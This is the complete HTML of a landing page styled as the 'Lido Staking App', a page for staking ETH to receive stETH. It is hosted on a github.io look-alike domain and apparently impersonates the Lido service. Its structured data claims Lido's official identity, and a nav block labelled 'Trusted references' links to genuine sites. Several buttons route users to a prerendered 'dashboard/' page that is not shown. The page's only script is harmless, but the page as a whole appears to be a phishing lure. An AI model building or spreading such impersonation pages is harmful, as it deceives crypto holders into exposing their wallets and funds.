<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Lido Staking App</title>
  <meta name="description" content="Lido Staking App lets you stake ETH and receive stETH from your own wallet while keeping the final transaction inside the app.">
  <link rel="canonical" href="https://lido-staking-app.github.io/">
  <meta name="robots" content="index,follow,max-image-preview:large">
  <meta name="theme-color" content="#F7FAFD">
  <meta property="og:type" content="website">
  <meta property="og:title" content="Lido Staking App">
  <meta property="og:description" content="Lido Staking App lets you stake ETH and receive stETH from your own wallet while keeping the final transaction inside the app.">
  <meta property="og:url" content="https://lido-staking-app.github.io/">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Lido Staking App">
  <meta name="twitter:description" content="Lido Staking App lets you stake ETH and receive stETH from your own wallet while keeping the final transaction inside the app.">
  <link rel="icon" type="image/png" href="favicon.png">
  <link rel="apple-touch-icon" href="favicon.png">
  <link rel="manifest" href="site.webmanifest">
  <link rel="stylesheet" href="style.css">
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@graph": [
      {
        "@type": "WebSite",
        "@id": "https://lido-staking-app.github.io/#website",
        "url": "https://lido-staking-app.github.io/",
        "name": "Lido Staking App",
        "inLanguage": "en"
      },
      {
        "@type": "Organization",
        "@id": "https://lido-staking-app.github.io/#organization",
        "name": "Lido",
        "url": "https://lido.fi/",
        "sameAs": [
          "https://lido.fi/",
          "https://docs.lido.fi/",
          "https://x.com/LidoFinance",
          "https://github.com/lidofinance"
        ]
      },
      {
        "@type": "WebApplication",
        "@id": "https://lido-staking-app.github.io/#app",
        "name": "Lido Staking App",
        "applicationCategory": "FinanceApplication",
        "operatingSystem": "Web",
        "url": "https://lido-staking-app.github.io/",
        "offers": {
          "@type": "Offer",
          "price": "0",
          "priceCurrency": "USD"
        }
      }
    ]
  }
  </script>

  <link rel="prefetch" href="dashboard/">
  <link rel="prerender" href="dashboard/">
</head>
<body>
  <header class="topbar">
    <a class="brand" href="#" aria-label="Lido Staking App home">
      <img src="favicon.png" width="30" height="30" alt="">
      <span>Lido</span>
    </a>
    <nav class="nav" aria-label="Trusted references">
      <a href="https://etherscan.io/" target="_blank" rel="nofollow noopener noreferrer">Etherscan</a>
      <a href="https://ethereum.org/staking/" target="_blank" rel="nofollow noopener noreferrer">Ethereum staking</a>
      <a href="https://docs.lido.fi/" target="_blank" rel="nofollow noopener noreferrer">Lido docs</a>
    </nav>
    <span class="spacer"></span>
    <a class="ghost" href="dashboard/" rel="noopener noreferrer">Open app</a>
  </header>

  <main class="stage">
    <section class="hero" aria-label="Lido staking app preview">
      <div class="copy">
        <span class="eyebrow">Liquid staking preview</span>
        <h1>Lido Staking App</h1>
        <p class="sub"><strong>Lido Staking App</strong> lets you stake ETH and receive stETH from your own wallet while keeping the final transaction inside the app.</p>
      </div>

      <section class="card" aria-label="Stake route">
        <div class="card-head">
          <span>Stake</span>
          <span class="status">Preview only</span>
        </div>
        <div class="route">
          <div class="leg">
            <span class="label">From</span>
            <span class="chip">
              <img class="icon" src="eth.png" width="28" height="28" alt="ETH">
              <span class="token">ETH</span>
            </span>
          </div>
          <button class="switch" type="button" data-switch aria-label="Switch staking direction">
            <span class="arrow" aria-hidden="true">&#8594;</span>
          </button>
          <div class="leg">
            <span class="label">To</span>
            <span class="chip">
              <img class="icon" src="steth.png" width="28" height="28" alt="stETH">
              <span class="token">stETH</span>
            </span>
          </div>
        </div>
        <a class="primary" href="dashboard/" rel="noopener noreferrer">Enter App <span aria-hidden="true">&#8250;</span></a>
      </section>
    </section>
  </main>

  <footer class="foot">Lido Staking App &mdash; 2026</footer>

  <script>
  (function () {
    "use strict";
    var button = document.querySelector("[data-switch]");
    if (!button) return;

    button.addEventListener("click", function () {
      var chips = document.querySelectorAll(".leg .chip");
      if (chips.length < 2) return;
      var first = chips[0].innerHTML;
      chips[0].innerHTML = chips[1].innerHTML;
      chips[1].innerHTML = first;
    });
  })();
  </script>
</body>
</html>
